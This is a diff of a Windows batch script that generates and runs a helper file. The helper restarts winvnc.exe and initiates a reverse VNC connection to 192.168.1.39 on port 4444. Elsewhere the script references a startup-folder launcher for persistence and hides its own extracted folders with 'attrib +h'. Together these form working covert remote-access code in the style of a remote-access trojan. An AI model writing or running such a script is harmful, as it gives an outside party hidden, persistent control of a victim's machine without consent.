@@ -13,12 +13,13 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
 
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
 (
-  @echo off
-taskkill /im winvnc.exe /f
-timeout /t 1 >nul
-start winvnc.exe -run
-timeout /t 1 >nul
-winvnc.exe -connect 192.168.1.39::4444
+  echo @echo off
+  echo REM Kill all instances of winvnc.exe
+  echo taskkill /f /im winvnc.exe >nul 2>&1
+  echo timeout /t 1 >nul
+  echo start winvnc.exe -run
+  echo timeout /t 1 >nul
+  echo winvnc.exe -connect 192.168.1.39::4444
 ) > "%script_dir%run_winvnc.bat"
 
 REM Check if both batch files exist in their respective locations
@@ -38,12 +39,11 @@ REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Start winvnc.exe and wait for permissions
-start /min "" winvnc.exe -run
-
+REM Start winvnc.exe for the first time and wait for 7 seconds
+start "" "%script_dir%winvnc.exe"
 timeout /t 7 >nul
 
+REM After waiting, call run_winvnc.bat
 call "%script_dir%run_winvnc.bat"
-timeout /t 2 >nul
-call "%script_dir%run_winvnc.bat"
+
 REM End of main.bat
